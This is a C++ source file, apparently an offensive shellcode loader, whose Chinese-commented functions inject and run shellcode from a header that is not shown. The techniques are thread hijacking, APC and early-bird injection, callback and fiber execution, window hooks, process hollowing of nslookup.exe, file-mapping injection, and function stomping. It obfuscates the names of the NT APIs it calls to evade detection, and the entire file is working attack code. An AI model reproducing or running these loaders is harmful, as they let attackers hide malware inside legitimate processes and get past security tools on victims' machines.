#include <Windows.h>
#include <iostream>
#include <dbghelp.h>
#include <winuser.h>
#include <tchar.h>
#include "loader.h"
#include <bluetoothapis.h>
#include <tlhelp32.h>

#pragma comment (lib,"Dbghelp.lib")
#pragma comment (lib,"User32.lib")
#pragma comment (lib,"onecore.lib")
#pragma comment (lib,"Bthprops.lib")

typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(
	IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress);

typedef NTSTATUS (NTAPI* pNtWriteVirtualMemory)(
	IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	IN PVOID                Buffer,
	IN ULONG                NumberOfBytesToWrite,
	OUT PULONG              NumberOfBytesWritten OPTIONAL);


typedef NTSTATUS(NTAPI* pNtTestAlert)(
	);

void test() {
	printf("111");
}

/*线程劫持相关*/
void threadHijacking() {
	int length = sizeof(shellcode);

	CONTEXT context;
	DWORD   dwOldProtection = NULL;
	context.ContextFlags = CONTEXT_ALL;


	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&test, NULL, CREATE_SUSPENDED, NULL);

	LPVOID lpMem = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(lpMem, shellcode, length);
	VirtualProtect(lpMem, length, PAGE_EXECUTE_READWRITE, &dwOldProtection);

	GetThreadContext(hThread, &context);
	context.Rip = (DWORD64)lpMem;
	SetThreadContext(hThread, &context);

	ResumeThread(hThread);
	WaitForSingleObject(hThread, -1);
}
void remoteHijacking() {
	char str1[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;
	DWORD dwOldProtection;
	CONTEXT context;
	context.ContextFlags = CONTEXT_ALL;

	CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	LPVOID lpMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	NtWriteVirtualMemory(pi.hProcess, lpMem, shellcode, sizeof(shellcode), NULL);
	VirtualProtectEx(pi.hProcess, lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);

	GetThreadContext(pi.hThread, &context);
	context.Rip = (DWORD64)lpMem;
	SetThreadContext(pi.hThread, &context);

	ResumeThread(pi.hThread);

}
LPWSTR CharToLPWSTR(const char* charStr) {
	// 计算目标 LPWSTR 所需的字符数
	int length = MultiByteToWideChar(CP_ACP, 0, charStr, -1, NULL, 0);

	// 为 LPWSTR 分配足够的内存
	LPWSTR lpwstr = new WCHAR[length];

	// 执行转换
	MultiByteToWideChar(CP_ACP, 0, charStr, -1, lpwstr, length);

	return lpwstr;
}
void remoteEnum(DWORD targetPid) {

	char str1[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);

	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	THREADENTRY32 te32;
	te32.dwSize = sizeof(THREADENTRY32);
	CONTEXT context;
	context.ContextFlags = CONTEXT_ALL;
	DWORD dwOldProtection;

	if (Thread32First(hSnapShot, &te32)) {
		do {
			if (te32.th32OwnerProcessID == targetPid) {


				HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, false, te32.th32ThreadID);

				if (hThread != NULL) {

					LPVOID lpMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
					NtWriteVirtualMemory(hProcess, lpMem, shellcode, sizeof(shellcode), NULL);
					VirtualProtectEx(hProcess, lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);


					SuspendThread(hThread);
					GetThreadContext(hThread, &context);
					context.Rip = (DWORD64)lpMem;
					SetThreadContext(hThread, &context);

					ResumeThread(hThread);
					WaitForSingleObject(hThread, -1);

				}

			}

		} while (Thread32Next(hSnapShot, &te32));
	}


}

/*APC注入相关*/
void AlertApc() {
	DWORD dwOldProtection = NULL;
	LPVOID lpMem = NULL;



	lpMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(lpMem, shellcode, sizeof(shellcode));
	VirtualProtect(lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
	QueueUserAPC((PAPCFUNC)lpMem, GetCurrentThread(), 0);

	SleepEx(INFINITE, 1);
}
void suspendApc() {


	DWORD dwOldProtection = NULL;
	LPVOID lpMem = NULL;

	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&test, NULL, CREATE_SUSPENDED, NULL);
	lpMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(lpMem, shellcode, sizeof(shellcode));
	VirtualProtect(lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
	QueueUserAPC((PAPCFUNC)lpMem, hThread, 0);

	ResumeThread(hThread);
	WaitForSingleObject(hThread, -1);

}
void earlyBirdApc() {

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;
	LPVOID lpMem;
	ULONG dwBytesWritten;
	DWORD dwOldProtection;

	char str1[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);

	CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	lpMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	NtWriteVirtualMemory(pi.hProcess, lpMem, shellcode, sizeof(shellcode), &dwBytesWritten);
	VirtualProtectEx(pi.hProcess, lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);

	QueueUserAPC((PAPCFUNC)lpMem, pi.hThread, 0);

	ResumeThread(pi.hThread);
	WaitForSingleObject(pi.hThread, -1);

}
void earlyBirdDebugApc() {

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;
	LPVOID lpMem;
	ULONG dwBytesWritten;
	DWORD dwOldProtection;

	char str1[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);

	CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, false, DEBUG_PROCESS, NULL, NULL, &si, &pi);
	lpMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	NtWriteVirtualMemory(pi.hProcess, lpMem, shellcode, sizeof(shellcode), &dwBytesWritten);
	VirtualProtectEx(pi.hProcess, lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);

	QueueUserAPC((PAPCFUNC)lpMem, pi.hThread, 0);

	DebugActiveProcessStop(pi.dwProcessId);

}
void ntAlertApc() {
	char str1[] = { 'N','t','T','e','s','t','A','l','e','r','t','\0' };
	pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);

	DWORD dwOldProtection = NULL;
	LPVOID lpMem = NULL;

	lpMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(lpMem, shellcode, sizeof(shellcode));
	VirtualProtect(lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
	QueueUserAPC((PAPCFUNC)lpMem, GetCurrentThread(), 0);


	NtTestAlert();

}

/*回调函数*/
void callBackExec() {
	DWORD dwOldProtection;

	LPVOID lpMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	memcpy(lpMem, shellcode, sizeof(shellcode));
	VirtualProtect(lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);

	//EnumThreadWindows(NULL, (WNDENUMPROC)lpMem, NULL);
	SymInitialize(GetCurrentProcess(), NULL, true);
	SymEnumProcesses((PSYM_ENUMPROCESSES_CALLBACK)lpMem, NULL);
}
/*纤程*/
void fiberExec() {
	DWORD dwOldProtection;

	LPVOID lpMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	memcpy(lpMem, shellcode, sizeof(shellcode));
	VirtualProtect(lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
	
	ConvertThreadToFiber(NULL);
	LPVOID lpFiber = CreateFiber(sizeof(shellcode), (LPFIBER_START_ROUTINE)lpMem, NULL);
	SwitchToFiber(lpFiber);
}
/*基于HOOK*/
void hookExec() {
	DWORD dwOldProtection;

	LPVOID lpMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	memcpy(lpMem, shellcode, sizeof(shellcode));
	VirtualProtect(lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
	HHOOK hhk = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)lpMem, NULL, GetCurrentThreadId());


	MSG msg;

	PostThreadMessage(GetCurrentThreadId(), WM_USER, 0, 0);
	PeekMessage(&msg, NULL, 0, 0, PM_REMOVE);
	UnhookWindowsHookEx(hhk);
}
/*进程镂空*/
void hollowingExec() {
	char str1[] = { 'N','t','U','n','m','a','p','V','i','e','w','O','f','S','e','c','t','i','o','n','\0' };
	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);
	char str2[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), str2);

	PIMAGE_DOS_HEADER pDosHeaders;
	PIMAGE_NT_HEADERS pNtHeaders;
	PIMAGE_SECTION_HEADER pSectionHeaders;
	PVOID FileImage;
	HANDLE hFile;
	DWORD FileReadSize;
	DWORD dwFileSize;


	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	PVOID RemoteImageBase;
	CONTEXT context;
	context.ContextFlags = CONTEXT_ALL;

	GetThreadContext(pi.hThread, &context);


	#ifdef _WIN64
		ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
	#endif
	#ifdef _X86_
		ReadProcessMemory(pi.hProcess, (PVOID)(context.Ebx + 8), &RemoteImageBase, sizeof(PVOID), NULL);
	#endif




	char path[] = "C:\\Windows\\System32\\calc.exe";
	hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	dwFileSize = GetFileSize(hFile, NULL);
	FileImage = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	ReadFile(hFile, FileImage, dwFileSize, &FileReadSize, NULL);
	CloseHandle(hFile);


	pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;
	pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders->e_lfanew);


	if ((SIZE_T)RemoteImageBase == pNtHeaders->OptionalHeader.ImageBase)
	{
		NtUnmapViewOfSection(pi.hProcess, RemoteImageBase);
	}

	LPVOID lpMem = VirtualAllocEx(pi.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	NtWriteVirtualMemory(pi.hProcess, lpMem, FileImage, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
	{
		pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)lpMem + pSectionHeaders->VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders->PointerToRawData), pSectionHeaders->SizeOfRawData, NULL);
	}

	DWORD oldProtect;
	VirtualProtectEx(pi.hProcess, lpMem, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &oldProtect);

	#ifdef _WIN64
		context.Rcx = (SIZE_T)((LPBYTE)lpMem + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
		NtWriteVirtualMemory(pi.hProcess, (PVOID)(context.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
	#endif
	#ifdef _X86_
		context.Eax = (SIZE_T)((LPBYTE)lpMem + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
		NtWriteVirtualMemory(pi.hProcess, (PVOID)(context.Ebx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
	#endif


	SetThreadContext(pi.hThread, &context);
	ResumeThread(pi.hThread);

}
/*映射注入*/
void mappingExec() {

	HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sizeof(shellcode), NULL);
	LPVOID lpMem = MapViewOfFile(hMapping, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sizeof(shellcode));
	memcpy(lpMem, shellcode, sizeof(shellcode));
	EnumThreadWindows(NULL, (WNDENUMPROC)lpMem, NULL);

}
void remoteMappingExec() {

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sizeof(shellcode), NULL);
	LPVOID lpMem = MapViewOfFile(hMapping, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sizeof(shellcode));
	memcpy(lpMem, shellcode, sizeof(shellcode));
	CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, false, NULL, NULL, NULL, &si, &pi);
	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, false, pi.dwProcessId);
	LPVOID addr = MapViewOfFile2(hMapping, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	printf("\t[+] Remote Mapping Address : 0x%p \n", addr);

	CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)addr, NULL, NULL, NULL);

}
void mappingEarlyBird() {
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sizeof(shellcode), NULL);
	LPVOID lpMem = MapViewOfFile(hMapping, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sizeof(shellcode));
	memcpy(lpMem, shellcode, sizeof(shellcode));
	CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, false, pi.dwProcessId);
	LPVOID addr = MapViewOfFile2(hMapping, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	printf("\t[+] Remote Mapping Address : 0x%p \n", addr);
	
	QueueUserAPC((PAPCFUNC)addr, pi.hThread, 0);
	ResumeThread(pi.hThread);



}
/*函数踩踏*/
void localFuncStompingExec() {

	// LPVOID sacrificedAddr = GetProcAddress(LoadLibrary(L"bthprops.cpl"), "BluetoothFindDeviceClose");
	LPVOID sacrificedAddr = &BluetoothFindDeviceClose;
	DWORD	dwOldProtection = NULL;
	VirtualProtect(sacrificedAddr, sizeof(shellcode), PAGE_READWRITE, &dwOldProtection);
	memcpy(sacrificedAddr, shellcode, sizeof(shellcode));
	VirtualProtect(sacrificedAddr, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);

	typedef void (*BluetoothFindDeviceClose)();
	BluetoothFindDeviceClose pFunc = (BluetoothFindDeviceClose)sacrificedAddr;
	pFunc();

	// EnumThreadWindows(NULL, (WNDENUMPROC)sacrificedAddr, NULL);
}
void remoteFuncStompingExec() {
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;
	TCHAR* szDllPath = _wcsdup(L"BluetoothApis.dll");

	CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	LPVOID lpDllPath = VirtualAllocEx(pi.hProcess, NULL, _tcslen(szDllPath) * sizeof(TCHAR) + sizeof(TCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	char str1[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);
	
	NtWriteVirtualMemory(pi.hProcess, lpDllPath, szDllPath, _tcslen(szDllPath) * sizeof(TCHAR) + sizeof(TCHAR), NULL);

	LPVOID lpLoadLibrary = (LPVOID)GetProcAddress(LoadLibraryW(L"kernel32.dll"), "LoadLibraryW");

	CreateRemoteThread(pi.hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)lpLoadLibrary, lpDllPath, NULL,NULL);
	ResumeThread(pi.hThread);
	Sleep(50);


	LPVOID sacrificedAddr = GetProcAddress(LoadLibrary(L"BluetoothApis.dll"), "BluetoothFindDeviceClose");
	DWORD	dwOldProtection = NULL;
	ULONG  byteWritten = NULL;


	VirtualProtectEx(pi.hProcess, sacrificedAddr, sizeof(shellcode), PAGE_READWRITE, &dwOldProtection);

	NtWriteVirtualMemory(pi.hProcess, sacrificedAddr, shellcode, sizeof(shellcode),&byteWritten);

	VirtualProtectEx(pi.hProcess, sacrificedAddr, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);

	HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)sacrificedAddr, NULL, NULL, NULL);
	WaitForSingleObject(hThread,-1);

}

int main(){
 
	
	remoteFuncStompingExec();

}
